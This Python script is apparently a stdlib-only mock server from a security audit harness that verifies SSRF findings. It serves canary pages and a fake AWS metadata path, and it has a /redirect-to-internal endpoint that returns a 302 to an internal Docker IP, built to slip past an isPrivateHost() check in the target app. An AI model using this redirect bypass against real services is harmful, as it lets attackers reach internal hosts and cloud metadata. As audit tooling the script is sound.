#!/usr/bin/env python3
"""
mock_server.py — Stdlib-only HTTP collector + fake internal target.

No pip installs required. Python 3.6+.

Endpoints:
  GET /ssrf-target             — Returns HTML with SSRF canary token in <title> and og:description.
  GET /latest/meta-data/       — Fake AWS metadata endpoint (same canary HTML).
  GET /internal-secret         — Returns HTML with INTERNAL canary (distinct from SSRF canary).
                                  Used as the redirect destination for C10 proof.
  GET /redirect-to-internal    — Returns 302 to http://<mock-own-IP>:<port>/internal-secret.
                                  Body is inert (does NOT contain INTERNAL_CANARY).
                                  setup.sh passes INTERNAL_TARGET env; mock self-discovers
                                  its own network IP at startup if INTERNAL_TARGET is unset.
  GET /__hits?since=<ts>       — Returns JSON array of hits recorded since Unix timestamp.
  ALL other paths               — Logged and returns 200 OK.

Writes:
  .audit_state/mock_hits.log       — Line-delimited JSON of every inbound request.
  .audit_state/canary.txt          — The SSRF canary UUID generated at startup.
  .audit_state/internal_canary.txt — The INTERNAL canary UUID generated at startup.
  .audit_state/mock_ip.txt         — The mock's own network IP (used by C10 exploit script).
  .audit_state/mock.pid            — PID of this process.
"""

import http.server
import json
import os
import socket
import sys
import time
import uuid
from pathlib import Path
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9099

# The .audit_state directory lives next to this script.
SCRIPT_DIR = Path(__file__).parent
AUDIT_STATE_DIR = SCRIPT_DIR / ".audit_state"

# ---------------------------------------------------------------------------
# C10 redirect target discovery
#
# INTERNAL_TARGET is the host:port the mock's 302 /redirect-to-internal points at.
# setup.sh may inject it via -e INTERNAL_TARGET after discovering the mock's IP.
# If unset, the mock self-discovers its own network IP at startup using
# socket.gethostbyname(socket.gethostname()) — this resolves to the container's
# docker-net IP, which is in the docker default address pool (172.16-31.x) and
# therefore already matches isPrivateHost()'s /^172\.(1[6-9]|2[0-9]|3[01])\./ rule.
# The exploit script reads .audit_state/mock_ip.txt (written in setup_state_dir())
# for the single source of truth used in both Proof A and the 302 Location.
# ---------------------------------------------------------------------------
def _discover_own_ip() -> str:
    """Return the container's primary network IP (the docker-net IP, not loopback)."""
    try:
        # Connect to a non-routable address to discover the outbound interface IP.
        # This never sends any packet — we just read getsockname() on a UDP socket.
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        # Fallback: resolve our own hostname.
        return socket.gethostbyname(socket.gethostname())


_INTERNAL_TARGET_ENV: str = os.environ.get("INTERNAL_TARGET", "")
# Resolved at module load (before server starts); written to mock_ip.txt in setup_state_dir.
_OWN_IP: str = _INTERNAL_TARGET_ENV.split(":")[0] if _INTERNAL_TARGET_ENV else _discover_own_ip()
INTERNAL_TARGET: str = _INTERNAL_TARGET_ENV if _INTERNAL_TARGET_ENV else f"{_OWN_IP}:{LISTEN_PORT}"

# ---------------------------------------------------------------------------
# In-memory hit log (also flushed to disk)
# ---------------------------------------------------------------------------
HITS: List[Dict[str, Any]] = []

# Canary token — generated once at startup, written to disk so exploit scripts
# can read the same value.
CANARY_TOKEN: str = f"SSRF-CANARY-{uuid.uuid4()}"

# Internal canary — DISTINCT from CANARY_TOKEN so Proof B of C10 unambiguously
# proves the internal hop was followed (not just the public redirect endpoint).
INTERNAL_CANARY: str = f"INTERNAL-SECRET-{uuid.uuid4()}"


def _canary_html_for(token: str) -> bytes:
    """Return an HTML page embedding *token* in multiple OG/meta positions.

    Uses double-quoted content="..." attributes — required because
    og/route.ts:201-213 extractMetaTag() regexes require quoted attributes.
    Reusing this helper for all canary pages guarantees the scrape matches.
    """
    html = (
        "<!DOCTYPE html><html><head>"
        f"<title>{token}</title>"
        f'<meta property="og:title" content="{token}-og-title">'
        f'<meta property="og:description" content="{token}-og-desc">'
        f'<meta name="description" content="{token}-meta-desc">'
        "</head><body>"
        f"<h1>{token}</h1>"
        "</body></html>"
    )
    return html.encode("utf-8")


def canary_html() -> bytes:
    """Return HTML embedding the SSRF canary (for /ssrf-target and /latest/meta-data/)."""
    return _canary_html_for(CANARY_TOKEN)


def internal_canary_html() -> bytes:
    """Return HTML embedding the INTERNAL canary (for /internal-secret — C10 target)."""
    return _canary_html_for(INTERNAL_CANARY)


def setup_state_dir() -> None:
    AUDIT_STATE_DIR.mkdir(parents=True, exist_ok=True)

    # Write SSRF canary
    (AUDIT_STATE_DIR / "canary.txt").write_text(CANARY_TOKEN)

    # Write INTERNAL canary (C10)
    (AUDIT_STATE_DIR / "internal_canary.txt").write_text(INTERNAL_CANARY)

    # Write the mock's own IP so exploit_10 can read a single source of truth
    # for both Proof A's direct target and the expected redirect destination.
    (AUDIT_STATE_DIR / "mock_ip.txt").write_text(_OWN_IP)

    # Write PID
    (AUDIT_STATE_DIR / "mock.pid").write_text(str(os.getpid()))

    print(f"[mock_server] Canary token:    {CANARY_TOKEN}", flush=True)
    print(f"[mock_server] Internal canary: {INTERNAL_CANARY}", flush=True)
    print(f"[mock_server] Own IP (C10):    {_OWN_IP}", flush=True)
    print(f"[mock_server] INTERNAL_TARGET: {INTERNAL_TARGET}", flush=True)
    print(f"[mock_server] State dir: {AUDIT_STATE_DIR}", flush=True)
    print(f"[mock_server] PID: {os.getpid()}", flush=True)


def record_hit(method: str, path: str, headers: dict, query: dict) -> None:
    entry = {
        "ts": time.time(),
        "method": method,
        "path": path,
        "headers": headers,
        "query": query,
    }
    HITS.append(entry)

    log_path = AUDIT_STATE_DIR / "mock_hits.log"
    with log_path.open("a") as fh:
        fh.write(json.dumps(entry) + "\n")

    print(
        f"[mock_server] HIT  {method} {path}  (total hits: {len(HITS)})",
        flush=True,
    )


class MockHandler(http.server.BaseHTTPRequestHandler):
    """Handle all incoming requests to the mock server."""

    def log_message(self, fmt: str, *args: Any) -> None:  # type: ignore[override]
        # Suppress default request logging — we do our own.
        pass

    def _parse_request(self) -> tuple[str, dict]:
        """Return (clean_path, query_dict)."""
        parsed = urlparse(self.path)
        query = {k: v for k, v in parse_qs(parsed.query).items()}
        return parsed.path, query

    def _collect_headers(self) -> dict:
        return dict(self.headers.items())

    def do_GET(self) -> None:
        path, query = self._parse_request()
        headers = self._collect_headers()
        record_hit("GET", path, headers, query)

        if path in ("/ssrf-target", "/ssrf-target/"):
            self._respond_canary()
        elif path.startswith("/latest/meta-data"):
            self._respond_canary()
        elif path in ("/internal-secret", "/internal-secret/"):
            # C10 internal target — serves the INTERNAL canary HTML.
            # This endpoint is the redirect DESTINATION; it is reached by the web
            # server following the 302 from /redirect-to-internal.
            self._respond_internal_canary()
        elif path in ("/redirect-to-internal", "/redirect-to-internal/"):
            # C10 redirect entrypoint — addressed by container NAME (passes isPrivateHost).
            # Returns a 302 whose Location points at the mock's own blocked-range IP.
            # IMPORTANT: the response body here must NOT contain INTERNAL_CANARY —
            # the canary may only reach the caller via the followed hop (/internal-secret).
            self._respond_redirect_to_internal()
        elif path == "/__hits":
            self._respond_hits(query)
        else:
            self._respond_ok(f"Mock server — hit recorded for {path}".encode())

    def do_POST(self) -> None:
        path, query = self._parse_request()
        headers = self._collect_headers()
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b""
        record_hit("POST", path, headers, {**query, "_body": body.decode(errors="replace")})
        self._respond_ok(b"POST recorded")

    def do_HEAD(self) -> None:
        path, query = self._parse_request()
        headers = self._collect_headers()
        record_hit("HEAD", path, headers, query)
        self.send_response(200)
        self.end_headers()

    # -----------------------------------------------------------------
    # Response helpers
    # -----------------------------------------------------------------

    def _respond_canary(self) -> None:
        body = canary_html()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _respond_internal_canary(self) -> None:
        """Serve the INTERNAL canary page — C10's redirect destination."""
        body = internal_canary_html()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _respond_redirect_to_internal(self) -> None:
        """Issue a 302 pointing at the mock's own blocked-range IP.

        The body is intentionally inert — it does NOT contain INTERNAL_CANARY.
        That canary may only reach the caller via the followed hop (/internal-secret),
        so a PASS on Proof B (canary in body) can only mean the redirect was followed.
        """
        dest = f"http://{INTERNAL_TARGET}/internal-secret"
        # Body: a short neutral message — MUST NOT contain INTERNAL_CANARY.
        body = b"redirecting to internal target"
        self.send_response(302)
        self.send_header("Location", dest)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _respond_hits(self, query: dict) -> None:
        since_list = query.get("since", ["0"])
        try:
            since = float(since_list[0]) if isinstance(since_list, list) else float(since_list)
        except (ValueError, IndexError, TypeError):
            since = 0.0

        filtered = [h for h in HITS if h["ts"] >= since]
        body = json.dumps(filtered).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _respond_ok(self, body: bytes) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main() -> None:
    setup_state_dir()

    server = http.server.HTTPServer((LISTEN_HOST, LISTEN_PORT), MockHandler)
    print(
        f"[mock_server] Listening on {LISTEN_HOST}:{LISTEN_PORT}",
        flush=True,
    )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[mock_server] Shutting down.", flush=True)
        server.server_close()


if __name__ == "__main__":
    main()
